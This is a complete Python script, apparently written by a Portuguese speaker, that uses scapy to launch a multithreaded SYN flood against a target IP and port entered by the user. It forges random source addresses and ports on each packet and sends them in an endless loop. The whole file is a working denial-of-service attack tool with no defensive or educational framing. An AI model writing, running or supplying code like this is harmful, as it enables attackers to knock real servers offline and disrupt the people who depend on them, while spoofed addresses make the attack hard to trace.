from scapy.all import IP, TCP, send
import random
import time
import threading

def gerar_syn(ip_alvo, porta_alvo):
    ip_src = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
    porta_src = random.randint(1024, 65535)
    ip = IP(src=ip_src, dst=ip_alvo)
    tcp = TCP(sport=porta_src, dport=porta_alvo, flags="S", seq=random.randint(1000, 99999))
    pacote = ip / tcp
    return pacote

def executar_ataque(ip_alvo, porta_alvo, intervalo=0.001):
    print(f"[⛏️] Iniciando ataque SYN Flood em {ip_alvo}:{porta_alvo}")
    try:
        while True:
            pacote = gerar_syn(ip_alvo, porta_alvo)
            send(pacote, verbose=False)
            time.sleep(intervalo)  # Pequeno delay para controlar intensidade
    except KeyboardInterrupt:
        print("[✔️] Ataque interrompido pelo utilizador.")

if __name__ == "__main__":
    ip_destino = input("IP de destino: ")
    porta_destino = int(input("Porta de destino: "))
    threads = int(input("Número de threads: "))

    for _ in range(threads):
        t = threading.Thread(target=executar_ataque, args=(ip_destino, porta_destino))
        t.start()
